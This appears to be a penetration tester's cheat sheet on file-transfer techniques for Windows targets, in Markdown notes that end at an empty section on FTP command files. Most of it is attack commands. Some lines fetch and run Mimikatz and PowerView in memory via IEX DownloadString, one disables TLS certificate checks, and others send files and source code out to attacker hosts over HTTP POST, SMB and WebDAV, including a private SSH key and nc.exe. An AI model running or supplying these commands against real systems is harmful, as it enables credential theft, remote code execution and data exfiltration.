
# Windows

## Downloads

### Base64

- maximum string length of 8,191 characters

```bash
# from linux
cat id_rsa |base64 -w 0;echo
# to window
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR......S0tLQo="))

# Verification
# Linux
md5sum id_rsa
# Windows
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### PowerShell

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### Fileless method

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

#### Errors Bypass

```powershell
# Internet Explorer first-launch
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# SSL/TLS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

```bash
# from linux
sudo impacket-smbserver share -smb2support /tmp/smbshare
# with creds
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test


# from window
copy \\192.168.220.133\share\nc.exe

# if copy doesn't work, mount server
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP

```bash
# from linux
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

# download from window
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Uploads

### Base64

```powershell
# from window
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
# verify
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

# to linux
echo I...0DQo= | base64 -d > hosts
md5sum hosts
```

```powershell
# from window
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.14.226:8000/ -Method POST -Body $b64

# to linux
nc -lvnp 8000
# decode
echo <base64> | base64 -d -w 0 > hosts
```

### PowerShell

[GitHub - uploadserver](https://github.com/Densaugeo/uploadserver)

```powershell
# host server on linux
uv run --with uploadserver python -m uploadserver

# upload from windows (internet require to install script)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.226:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### SMB

- Can use when SMB is not allowed for outbound connections
- An alternative is to run SMB over HTTP with `WebDav`

```bash
# setting up dav server on linux
uvx --from wsgidav --with cheroot wsgidav --host 0.0.0.0 --port 80 --root "$(pwd)" --auth anonymous

# from window
# default dav root
dir \\192.168.49.128\DavWWWRoot
# file upload
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP

```bash
# from linux
sudo python3 -m pyftpdlib --port 21 --write

# from window
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

Create a command file for ftp clie

```bash

```